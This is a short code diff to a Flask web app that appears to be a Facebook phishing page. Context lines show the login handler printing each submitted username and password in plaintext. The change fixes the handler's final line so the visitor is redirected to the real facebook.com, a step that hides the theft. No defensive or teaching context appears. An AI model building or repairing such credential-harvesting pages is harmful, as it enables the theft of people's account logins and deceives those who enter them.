@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, request, redirect
 
 app = Flask(__name__)
 
@@ -18,8 +18,8 @@ def login():
     # Also print in terminal
     print(f"[LOG] Username: {username}, Password: {password}")
 
-    return
-  redirect("https://www.facebook.com/")
+    # Correct redirect
+    return redirect("https://www.facebook.com/")
 
 if __name__ == '__main__':
     app.run(debug=True)
